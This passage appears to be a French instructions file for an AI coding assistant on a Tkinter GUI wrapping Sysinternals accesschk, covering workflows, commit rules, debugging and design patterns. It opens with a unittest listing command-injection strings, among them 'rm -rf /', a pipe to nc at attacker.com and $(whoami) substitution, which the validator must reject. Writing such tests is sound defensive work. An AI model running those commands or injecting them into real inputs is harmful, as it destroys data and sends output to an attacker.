    def test_command_injection_blocked(self):
        """Command injection attempts should be blocked."""
        injection_attempts = [
            "test.exe; rm -rf /",
            "test.exe && calc.exe",
            "test.exe | nc attacker.com 1234",
            "test.exe`whoami`",
            "test.exe$(whoami)",
        ]
        
        for attempt in injection_attempts:
            with self.subTest(injection=attempt):
                is_valid, error = validate_executable_path(attempt)
                self.assertFalse(is_valid, f"Injection should be blocked: {attempt}")
    
    def test_sanitize_removes_dangerous_chars(self):
        """Sanitize should remove or escape dangerous characters."""
        dangerous = "path&test|cmd;whoami"
        
        result = sanitize_command_args(dangerous)
        
        self.assertIsInstance(result, list)
        # Vérifier qu'aucun caractère dangereux n'est présent non échappé
        result_str = result[0]
        if not result_str.startswith('"'):
            self.assertNotIn('&', result_str)
            self.assertNotIn('|', result_str)
            self.assertNotIn(';', result_str)


if __name__ == "__main__":
    unittest.main()
```

### Correction de bug

**Actions obligatoires** :
1. **Reproduire le bug** : Créer test qui échoue
2. Corriger le code dans `accesschk_gui_tk.py`
3. Vérifier que le test passe maintenant
4. Tester manuellement l'interface si nécessaire
5. Mettre à jour `AMELIORATIONS.md` si bug important
6. Logger la correction pour traçabilité
7. ❌ **NE JAMAIS** corriger sans test de non-régression

---

## 🚨 Interdictions Formelles

### ❌ À NE JAMAIS FAIRE

1. **Créer des fichiers à la racine sans confirmation**
   - Uniquement `AccessChkGUI.py`, `README.md`, `.gitignore` autorisés
   - Tout le reste va dans `src/`, `tests/`, `docs/`, `scripts/`, `tools/`

2. **Utiliser des imports relatifs complexes**
   - Toujours utiliser imports absolus depuis la racine
   - `from src.module import ...` plutôt que `from ..module import ...`

3. **Modifier la sécurité sans tests**
   - Toute modification de validation DOIT être testée
   - Ne jamais relâcher les contraintes de sécurité
   - Toujours ajouter tests pour nouvelles validations

4. **Oublier de mettre à jour la documentation**
   - ❌ Ajouter feature sans documenter dans `docs/NOUVELLES_FONCTIONNALITES.md`
   - ❌ Optimiser sans documenter dans `docs/AMELIORATIONS.md`
   - ❌ Modifier UI sans mettre à jour `README.md`
   - ❌ Changer architecture sans créer/mettre à jour `docs/ARCHITECTURE.md`

5. **Utiliser des exceptions génériques**
   - ❌ `except Exception:` est interdit
   - ❌ `except:` est interdit
   - ✅ Toujours utiliser exceptions spécifiques (`FileNotFoundError`, `ValueError`, etc.)

6. **Ne pas valider les entrées utilisateur**
   - Toujours utiliser `validate_executable_path()`, `validate_target_paths()`
   - Toujours utiliser `sanitize_command_args()`
   - Jamais faire confiance aux entrées utilisateur

7. **Modifier `AppConfig` sans raison**
   - Les constantes sont optimisées
   - Documenter toute modification avec justification
   - Tester l'impact sur les performances

8. **Créer un fichier monolithique**
   - Diviser les responsabilités en modules logiques
   - Chaque module doit avoir une responsabilité claire
   - Maximum ~500 lignes par module (guideline)

9. **Ne pas utiliser le logging**
   - Toujours logger les opérations importantes
   - Utiliser les niveaux appropriés (DEBUG, INFO, WARNING, ERROR)
   - Jamais de `print()` pour les opérations critiques

10. **Ignorer les chemins relatifs**
    - Toujours utiliser `pathlib.Path`
    - Toujours construire chemins depuis `PROJECT_ROOT`
    - Jamais de chemins en dur ou dépendants du CWD

---

## 💬 Messages de Commit

### Format obligatoire
```
<type>(<scope>): <description courte>

<description détaillée optionnelle>
```

### Types autorisés
- **feat** : Nouvelle fonctionnalité
- **fix** : Correction de bug
- **sec** : Amélioration de sécurité
- **perf** : Amélioration de performance
- **docs** : Documentation uniquement
- **test** : Ajout/modification de tests
- **refactor** : Refactorisation sans changement de comportement
- **style** : Formatage, pas de changement de code

### Scopes courants
- **gui** : Interface Tkinter
- **security** : Sécurité et validation
- **export** : Fonctionnalités d'export
- **scan** : Logique de scan accesschk
- **filter** : Système de filtrage
- **history** : Historique des scans
- **config** : Configuration (AppConfig)

### Exemples de bons messages
```bash
✅ feat(gui): add keyboard shortcuts (Ctrl+N, Ctrl+R, Ctrl+E)
✅ sec(validation): add extension check in validate_executable_path
✅ perf(display): reduce batch size from 250 to 100 for better responsiveness
✅ fix(filter): correct folders-only filtering with RW prefix
✅ docs(ameliorations): document security enhancements
✅ test(validation): add tests for dangerous characters detection
```

### Exemples de mauvais messages
```bash
❌ update code
❌ fix
❌ wip
❌ amélioration interface
```

### Règles
- **Impératif** : "add" pas "added" ou "adds"
- **Minuscule** : pas de majuscule après le type
- **Pas de point** à la fin
- **50 caractères max** pour la description courte
- **Corps de 72 caractères** par ligne si ajouté
- **Français ou anglais** : Cohérent avec l'existant

---

## 🔄 Workflows Types

### Workflow 1 : Ajouter une nouvelle fonctionnalité GUI

**Étapes** :
1. **Planifier** : Créer document `.planning/YYYY-MM-DD_description.md` si majeur
2. **Créer module** (si nécessaire) : `src/nouvelle_feature.py`
3. **Modifier GUI** : Intégrer dans `src/gui.py`
   - Ajouter méthode dans classe `AccessChkGUI`
   - Ajouter widgets dans `setup_ui()`
4. **Créer tests** : `tests/test_nouvelle_feature.py` (pytest)
5. **Tester** : `pytest tests/test_nouvelle_feature.py -v`
6. **Documenter** :
   - `docs/NOUVELLES_FONCTIONNALITES.md` (description feature)
   - `README.md` (si visible utilisateur)
   - `docs/ARCHITECTURE.md` (si nouveau module)
   - Docstrings complètes
7. **Commit** : `feat(gui): add <description>`

**Exemple concret** : Ajout d'un filtre par permissions
```
.planning/2025-11-11_filtre-permissions.md
├─ Étape 1: Créer src/filters.py avec filter_by_permissions()
├─ Étape 2: Modifier src/gui.py pour ajouter widgets
├─ Étape 3: Créer tests/test_filters.py
├─ Étape 4: pytest tests/test_filters.py -v
├─ Étape 5: Documenter dans docs/NOUVELLES_FONCTIONNALITES.md
└─ Étape 6: Commit feat(filter): add permission-based filtering
```

### Workflow 2 : Améliorer la sécurité

**Étapes** :
1. **Identifier** la faille ou amélioration possible
2. **Planifier** : Document `.planning/` si changement majeur
3. **Modifier validation** : `src/validation.py`
4. **Créer tests** : `tests/test_validation.py` ou `tests/test_security.py`
5. **Exécuter tests** : `pytest tests/test_validation.py -v`
6. **Vérifier** : `pytest tests/ -v` (tous les tests)
7. **Documenter** :
   - `docs/AMELIORATIONS.md` (section Sécurité)
   - Logs et commentaires dans le code
   - `docs/CHANGELOG.md`
8. **Commit** : `sec(validation): add <description>`

**Exemple concret** : Validation des chemins réseau UNC
```
1. Identifier : Chemins UNC (\\server\share) pas validés
2. Ajouter fonction validate_unc_path() dans src/validation.py
3. Intégrer dans validate_target_paths()
4. Créer test_unc_paths() dans tests/test_validation.py
5. pytest tests/test_validation.py::test_unc_paths -v
6. Documenter dans docs/AMELIORATIONS.md
7. Commit: sec(validation): add UNC path validation
```

### Workflow 3 : Refactoriser le code monolithique

**Objectif** : Migrer `accesschk_gui_tk.py` vers structure modulaire

**Étapes** :
1. **Planifier** : Créer `.planning/2025-11-11_refactoring-modulaire.md`
2. **Créer structure** :
   ```powershell
   mkdir src, tests, docs, scripts, tools
   New-Item src/__init__.py, tests/__init__.py
   ```
3. **Extraire modules** (un par un, avec tests après chaque) :
   - `src/config.py` : Extraire `AppConfig`
   - `src/validation.py` : Extraire fonctions de validation
   - `src/utils.py` : Extraire utilitaires (encodage, etc.)
   - `src/scanner.py` : Extraire logique accesschk
   - `src/export.py` : Extraire gestionnaires d'export
   - `src/history.py` : Extraire gestionnaire d'historique
   - `src/gui.py` : Garder interface Tkinter
4. **Créer lanceur** : `AccessChkGUI.py` (simple)
   ```python
   """AccessChk GUI - Windows Permissions Scanner."""
   from src.gui import main
   
   if __name__ == "__main__":
       main()
   ```
5. **Migrer tests** : Déplacer `test_*.py` vers `tests/`
6. **Migrer docs** : Déplacer `*.md` vers `docs/`
7. **Migrer scripts** : Déplacer `*.ps1`, `*.py` scripts vers `scripts/`
8. **Migrer outil** : Déplacer `accesschk.exe` vers `tools/`
9. **Mettre à jour imports** : Partout dans le code
10. **Vérifier tests** : `pytest tests/ -v`
11. **Mettre à jour docs** :
    - Créer `docs/ARCHITECTURE.md` (nouveau)
    - Mettre à jour `README.md`
    - Mettre à jour `docs/AMELIORATIONS.md`
12. **Commit** : `refactor: split monolithic file into modular structure`

**Ordre de refactorisation recommandé** :
```
1. src/config.py       (pas de dépendances)
2. src/utils.py        (dépend de config)
3. src/validation.py   (dépend de config)
4. src/scanner.py      (dépend de config, validation, utils)
5. src/export.py       (dépend de config)
6. src/history.py      (dépend de config)
7. src/gui.py          (dépend de tout)
```

### Workflow 4 : Optimiser les performances

**Étapes** :
1. **Mesurer AVANT** : Profiling pour identifier goulot
   ```python
   import cProfile
   import pstats
   
   profiler = cProfile.Profile()
   profiler.enable()
   # Code à mesurer
   profiler.disable()
   
   stats = pstats.Stats(profiler)
   stats.sort_stats('cumulative')
   stats.print_stats(20)
   ```
2. **Planifier** : Stratégie d'optimisation
3. **Coder** : Modifier fonction concernée (ex: `src/scanner.py`)
4. **Mesurer APRÈS** : Vérifier amélioration
5. **Tester** : `pytest tests/ -v` (s'assurer pas de régression)
6. **Documenter** :
   - `docs/AMELIORATIONS.md` (section Performances)
   - Mentionner gain mesuré (ex: -30% temps, +50% throughput)
7. **Commit** : `perf(<scope>): <description>`

**Exemple concret** : Optimisation cache dossiers
```
1. Mesurer : 500ms pour vérifier 1000 dossiers
2. Implémenter LRU cache dans src/utils.py
   from functools import lru_cache
   
   @lru_cache(maxsize=1000)
   def is_dir_cached(path: str) -> bool:
       return Path(path).is_dir()
3. Intégrer dans src/scanner.py
4. Mesurer : 50ms avec cache (10x speedup)
5. pytest tests/ -v
6. Documenter : "90% réduction temps de vérification grâce au cache LRU"
7. Commit: perf(scanner): add LRU cache for directory checks (10x speedup)
```

### Workflow 5 : Corriger un bug

**Étapes** :
1. **Reproduire** : Créer test qui échoue
   ```python
   def test_bug_unicode_paths():
       """Bug: Unicode paths crash the scanner."""
       path = "C:\\Utilisateurs\\José"
       # Ce test doit échouer initialement
       result = process_path(path)
       assert result is not None
   ```
2. **Débugger** : Identifier cause (ex: dans `src/utils.py`)
3. **Corriger** : Modifier code
4. **Vérifier** : Test passe maintenant
5. **Tester** : `pytest tests/ -v` (non-régression)
6. **Documenter** : Commenter la correction si complexe
7. **Commit** : `fix(<scope>): <description>`

**Exemple concret** : Bug d'encodage Unicode
```
1. Créer test_unicode_paths() dans tests/test_utils.py (ÉCHOUE)
2. Identifier : decode() sans fallback dans src/utils.py
3. Corriger : Utiliser decode_bytes_with_fallback()
4. Test PASSE
5. pytest tests/ -v (tous passent)
6. Commit: fix(encoding): handle Unicode paths with CP1252/Latin-1 fallback
```

### Workflow 6 : Ajouter export PDF (exemple complet)

**Planification** (`.planning/2025-11-11_export-pdf.md`) :
```markdown
# Export PDF pour AccessChk GUI

## Vue d'ensemble
Ajouter export PDF pour rapports professionnels

## Étapes
1. ✅ Choisir bibliothèque (reportlab vs fpdf2)
2. ⏳ Installer dépendance
3. ⏳ Créer src/export_pdf.py
4. ⏳ Intégrer dans src/gui.py
5. ⏳ Tests
6. ⏳ Documentation
```

**Exécution** :
```powershell
# 1. Installer dépendance
pip install reportlab

# 2. Créer module
# src/export_pdf.py
from pathlib import Path
from typing import List
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas

class PDFExporter:
    """Export scan results to PDF format."""
    
    def export(self, data: List[str], output: Path) -> bool:
        """Generate PDF report."""
        # Implementation...

# 3. Intégrer dans GUI
# src/gui.py
from src.export_pdf import PDFExporter

class AccessChkGUI:
    def export_to_pdf(self):
        exporter = PDFExporter()
        exporter.export(self.results, self.output_path)

# 4. Tests
# tests/test_export_pdf.py
def test_pdf_export_creates_file(tmp_path):
    exporter = PDFExporter()
    output = tmp_path / "report.pdf"
    success = exporter.export(["test"], output)
    assert success
    assert output.exists()

# 5. Exécuter
pytest tests/test_export_pdf.py -v

# 6. Documenter
# docs/NOUVELLES_FONCTIONNALITES.md
# + Section "Export PDF"

# 7. Commit
git add .
git commit -m "feat(export): add PDF export with reportlab"
```

---

## 🐛 Debugging & Troubleshooting

### Problèmes courants et solutions

#### 1. "accesschk.exe not found"
**Cause** : accesschk.exe pas dans le même dossier que le GUI
**Solution** :
```powershell
# Télécharger depuis Sysinternals
# https://learn.microsoft.com/sysinternals/downloads/accesschk
# Placer dans le même dossier que accesschk_gui_tk.py
```

#### 2. "UnicodeDecodeError"
**Cause** : Caractères spéciaux dans chemins/résultats
**Solution** : Utiliser `decode_bytes_with_fallback()`
```python
# ✅ BON
output = decode_bytes_with_fallback(result.stdout)

# ❌ MAUVAIS
output = result.stdout.decode('utf-8')  # Peut crasher
```

#### 3. "Access denied" lors du scan
**Cause** : Droits insuffisants pour scanner dossiers système
**Solution** :
```powershell
# Lancer en tant qu'administrateur
# Clic droit > Exécuter en tant qu'administrateur
# Ou vérifier avec is_running_elevated()
```

#### 4. Interface qui freeze
**Cause** : Trop de données affichées d'un coup
**Solution** : Vérifier `AppConfig.BATCH_SIZE` et `MAX_DISPLAYED_LINES`
```python
# Ajuster dans AppConfig
BATCH_SIZE = 50  # Réduire si freeze
MAX_DISPLAYED_LINES = 3000  # Limiter affichage
```

#### 5. Caractères "�" dans l'affichage
**Cause** : Problème d'encodage Windows (CP1252)
**Solution** : `decode_bytes_with_fallback()` essaie automatiquement
```python
def decode_bytes_with_fallback(data: bytes) -> str:
    """Try UTF-8, then CP1252, then Latin-1."""
    for encoding in ['utf-8', 'cp1252', 'latin-1']:
        try:
            return data.decode(encoding)
        except UnicodeDecodeError:
            continue
    return data.decode('utf-8', errors='replace')
```

### Outils de debug

**Logging détaillé** :
```python
import logging

logging.basicConfig(
    filename="accesschk_gui.log",
    level=logging.DEBUG,  # DEBUG pour détails max
    format="%(asctime)s - %(levelname)s - %(funcName)s - %(message)s"
)
```

**Profiling performance** :
```python
import time

start = time.time()
# Code à mesurer
elapsed = time.time() - start
logging.info(f"Opération terminée en {elapsed:.2f}s")
```

**Vérifier droits admin** :
```python
if not is_running_elevated():
    logging.warning("Application non lancée en administrateur")
    # Afficher avertissement dans GUI
```

**Debug Tkinter** :
```python
# Afficher état des widgets
print(self.text_display.get("1.0", tk.END))
print(self.var_dirs_only.get())
```

---

## ✅ Workflow de Validation

Avant chaque commit proposé :

```powershell
# 1. Vérifier que tous les tests passent
python test_suite.py

# 2. Tester manuellement l'interface si modification GUI
python accesschk_gui_tk.py

# 3. Vérifier que la documentation est à jour
# - README.txt si changement utilisateur
# - AMELIORATIONS.md si amélioration technique
# - NOUVELLES_FONCTIONNALITES.md si nouvelle feature

# 4. Vérifier le log pour erreurs
type accesschk_gui.log

# 5. Proposer le commit avec message clair
git add .
git commit -m "feat(gui): add new feature with tests and docs"
```

---

## 📚 Documentation à Consulter

Avant toute action complexe, consulter :

1. **`README.txt`** - Documentation utilisateur et quick-start
2. **`AMELIORATIONS.md`** - Historique des améliorations techniques
3. **`NOUVELLES_FONCTIONNALITES.md`** - Historique des nouvelles features
4. **`accesschk_gui_tk.py`** - Code source principal (docstrings complètes)

---

## 🎯 Phrases Clés de l'Utilisateur

### "je veux ajouter une nouvelle fonctionnalité"
→ Réponse : "Je vais modifier `accesschk_gui_tk.py` et créer les tests. C'est une modification majeure ? Si oui, je crée un document de planification dans `.planning/`. Confirmes-tu ?"

### "il faut améliorer la sécurité"
→ Réponse : "Je vais ajouter une validation dans `accesschk_gui_tk.py`, créer les tests dans `test_validation.py`, et documenter dans `AMELIORATIONS.md`. Quelle faille veux-tu corriger ?"

### "l'interface est lente"
→ Réponse : "Je vais mesurer les performances, identifier le goulot, optimiser, puis documenter l'amélioration dans `AMELIORATIONS.md` avec le gain mesuré. Confirmes-tu ?"

### "ajoute ce fichier"
→ Réponse : "Où dois-je placer ce fichier ? À la racine (simple) ou créer un dossier (si architecture change) ? Quel est son rôle ?"

### Toute demande de création de dossier
→ Réponse : "⚠️ Le projet a une structure plate volontaire. Es-tu sûr de vouloir créer un dossier ? Sinon je peux intégrer dans `accesschk_gui_tk.py`. Confirmes-tu ?"

---

## 🔄 Mise à Jour de ce Fichier

Ce fichier doit être mis à jour lors de :
- Changements de structure majeurs
- Ajout de nouvelles règles
- Retours d'expérience de l'utilisateur
- Évolution des bonnes pratiques

**Historique des versions** :
- **v1.0** (11 novembre 2025) : Version initiale adaptée du projet Pokémon Dataset Generator

**Dernière mise à jour** : 11 novembre 2025  
**Par** : Utilisateur + GitHub Copilot

---

## 💡 Rappels Importants

> **"À la racine on ne devrait avoir que le lanceur et le README"**  
> — Règle d'or pour un projet professionnel

> **"Structure simple = Maintenance simple, mais structure organisée = Scalabilité"**  
> — Principe du projet AccessChk GUI

> **"Toujours valider les entrées utilisateur"**  
> — Règle de sécurité n°1

> **"Un test qui échoue vaut mieux qu'un bug en production"**  
> — Règle de qualité

> **"Logger tout, débugger facilement"**  
> — Règle de maintenabilité

**Priorités du projet** :
1. **Sécurité d'abord** : Validation stricte, protection injection
2. **Architecture propre** : Modules logiques, séparation des responsabilités
3. **Tests complets** : Couverture maximale, pas de régression
4. **Performance ensuite** : Optimiser après que ça marche
5. **Fonctionnalités enfin** : Ajouter features sur base solide

**Cycle de développement idéal** :
```
Demande → Planification → Refactoring (si nécessaire) →
Feature → Tests → Documentation → Commit → Validation
```

---

## 🎯 Checklist de Développement

### Avant de commencer une feature

- [ ] Créer document `.planning/` si fonctionnalité majeure
- [ ] Identifier le(s) module(s) concerné(s)
- [ ] Vérifier si refactorisation nécessaire
- [ ] Proposer plan à l'utilisateur

### Pendant le développement

- [ ] Suivre conventions de nommage (PEP 8)
- [ ] Ajouter type hints partout
- [ ] Documenter avec docstrings complètes
- [ ] Logger les opérations importantes
- [ ] Valider toutes les entrées utilisateur
- [ ] Utiliser exceptions spécifiques
- [ ] Construire chemins avec `pathlib.Path`

### Après le code

- [ ] Créer tests unitaires (pytest)
- [ ] Exécuter `pytest tests/ -v`
- [ ] Vérifier couverture de code (`--cov`)
- [ ] Tester manuellement l'interface si GUI
- [ ] Vérifier pas de régression

### Documentation

- [ ] Mettre à jour `README.md` si changement utilisateur
- [ ] Mettre à jour `docs/AMELIORATIONS.md` si amélioration technique
- [ ] Mettre à jour `docs/NOUVELLES_FONCTIONNALITES.md` si nouvelle feature
- [ ] Mettre à jour `docs/ARCHITECTURE.md` si changement de structure
- [ ] Mettre à jour `docs/CHANGELOG.md`

### Avant le commit

- [ ] `pytest tests/ -v` (tous les tests passent)
- [ ] Vérifier que accesschk_gui.log n'a pas d'erreurs
- [ ] Vérifier format du message de commit
- [ ] Relire les changements (`git diff`)

---

## 📊 Métriques de Qualité

### Objectifs à atteindre

**Tests** :
- ✅ Couverture de code : > 80%
- ✅ Tous les tests passent (0 échecs)
- ✅ Tests pour toutes les fonctions de validation
- ✅ Tests pour tous les exports

**Code** :
- ✅ Pas d'exceptions génériques (`except Exception:`)
- ✅ Pas de `print()` dans le code de production
- ✅ Pas de chemins en dur
- ✅ Tous les modules < 500 lignes

**Sécurité** :
- ✅ Validation de tous les chemins
- ✅ Sanitization de tous les arguments
- ✅ Logging de toutes les validations
- ✅ Pas de caractères dangereux non échappés

**Documentation** :
- ✅ README.md à jour
- ✅ Toutes les fonctions ont docstrings
- ✅ CHANGELOG.md tenu à jour
- ✅ ARCHITECTURE.md existe et est complet

### Outils recommandés

**Qualité de code** :
```powershell
# Installer outils
pip install black flake8 pylint mypy pytest pytest-cov

# Formatage automatique
black src/ tests/

# Linting
flake8 src/ tests/ --max-line-length=100

# Type checking
mypy src/ --strict

# Couverture de code
pytest tests/ --cov=src --cov-report=html
```

**Analyse de sécurité** :
```powershell
# Installer bandit
pip install bandit

# Scanner les vulnérabilités
bandit -r src/ -f screen
```

---

## 📌 Spécificités AccessChk GUI

### Particularités du projet

1. **Outil Windows uniquement** : `accesschk.exe` de Sysinternals
2. **Migration progressive** : De structure plate vers modulaire
3. **Sécurité critique** : Validation stricte (injection de commandes)
4. **Interface Tkinter** : GUI native, pas de framework web
5. **Droits admin** : Scan complet nécessite élévation
6. **Encodage complexe** : Windows utilise CP1252/Latin-1

### Architecture recommandée

**Séparation des responsabilités** :
- `src/config.py` : Configuration centralisée
- `src/validation.py` : Sécurité et validation
- `src/scanner.py` : Logique d'exécution accesschk
- `src/utils.py` : Utilitaires (encodage, chemins, etc.)
- `src/export.py` : Exports multi-formats
- `src/history.py` : Gestion de l'historique
- `src/gui.py` : Interface Tkinter (orchestration)

**Dépendances entre modules** :
```
config.py (base)
    ↓
utils.py → validation.py
    ↓           ↓
    └──→ scanner.py ←──┐
    ↓           ↓       │
export.py   history.py │
    ↓           ↓       │
    └──→ gui.py ←──────┘
```

### Points d'attention

**Migration progressive** :
- ✅ Commencer par modules simples (config, utils)
- ✅ Tester après chaque extraction de module
- ✅ Garder `accesschk_gui_tk.py` fonctionnel pendant migration
- ✅ Créer lanceur simple uniquement à la fin

**Tests pendant refactorisation** :
- ✅ Tests existants doivent continuer à passer
- ✅ Ajouter tests pour nouveaux modules
- ✅ Ne pas merger de code non testé

**Performance** :
- ✅ Tester avec + de 10 000 lignes
- ✅ Profiler avant et après optimisations
- ✅ Garder interface responsive (batch processing)

**Sécurité** :
- ✅ Toujours tester avec chemins Unicode (é, è, ç, etc.)
- ✅ Tester avec chemins très longs (> 200 caractères)
- ✅ Tester avec caractères dangereux
- ✅ Logger toutes les validations pour audit

**Compatibilité** :
- ✅ Tester avec et sans droits admin
- ✅ Tester sur Windows 10 et Windows 11
- ✅ Vérifier encodage console (CP1252, UTF-8)

### Ressources externes

- **accesschk.exe** : https://learn.microsoft.com/sysinternals/downloads/accesschk
- **Tkinter docs** : https://docs.python.org/3/library/tkinter.html
- **Windows permissions** : https://learn.microsoft.com/windows/security/
- **pytest docs** : https://docs.pytest.org/
- **pathlib guide** : https://docs.python.org/3/library/pathlib.html

### Exemples de commandes quotidiennes

**Développement** :
```powershell
# Lancer l'application
python AccessChkGUI.py

# Ou si pas encore refactorisé
python accesschk_gui_tk.py

# Lancer en admin (pour tests complets)
Start-Process python -ArgumentList "AccessChkGUI.py" -Verb RunAs
```

**Tests** :
```powershell
# Tous les tests
pytest tests/ -v

# Tests avec couverture
pytest tests/ --cov=src --cov-report=html

# Tests d'un module spécifique
pytest tests/test_validation.py -v

# Tests en mode watch (redémarre à chaque changement)
pytest-watch tests/

# Tests avec output détaillé
pytest tests/ -vv -s
```

**Qualité** :
```powershell
# Formatage
black src/ tests/ --line-length=100

# Linting
flake8 src/ tests/ --max-line-length=100 --ignore=E203,W503

# Type checking
mypy src/ --ignore-missing-imports

# Sécurité
bandit -r src/ -ll
```

**Build** :
```powershell
# Build executable (après refactorisation)
.\scripts\build_gui.ps1

# Ou avec PyInstaller directement
pyinstaller --onefile --noconsole --name AccessChkGUI `
    --add-data "tools\accesschk.exe;tools" `
    --icon icon.ico `
    AccessChkGUI.py
```

### Patterns de conception recommandés

**Singleton pour AppConfig** :
```python
# src/config.py
class AppConfig:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
```

**Factory pour exports** :
```python
# src/export.py
class ExportFactory:
    @staticmethod
    def create_exporter(format_type: str):
        exporters = {
            'json': JSONExporter,
            'csv': CSVExporter,
            'xml': XMLExporter,
            'pdf': PDFExporter,
        }
        return exporters[format_type]()
```

**Observer pour GUI updates** :
```python
# src/gui.py
class AccessChkGUI:
    def __init__(self):
        self.observers = []
    
    def register_observer(self, callback):
        self.observers.append(callback)
    
    def notify_observers(self, event):
        for callback in self.observers:
            callback(event)
```

### Anti-patterns à éviter

❌ **God Object** : Tout dans `AccessChkGUI`
```python
# MAUVAIS
class AccessChkGUI:
    def validate_path(self): ...
    def sanitize_args(self): ...
    def run_scan(self): ...
    def export_json(self): ...
    def export_csv(self): ...
    # 2000+ lignes...
```

✅ **Séparation des responsabilités**
```python
# BON
from src.validation import validate_path
from src.scanner import AccessChkRunner
from src.export import ExportFactory

class AccessChkGUI:
    def __init__(self):
        self.scanner = AccessChkRunner()
        self.exporter = ExportFactory()
    # 300 lignes max
```

---

🎉 **Bon développement avec AccessChk GUI !** 🎉

*Ces instructions sont vivantes : mettez-les à jour selon l'évolution du projet.*
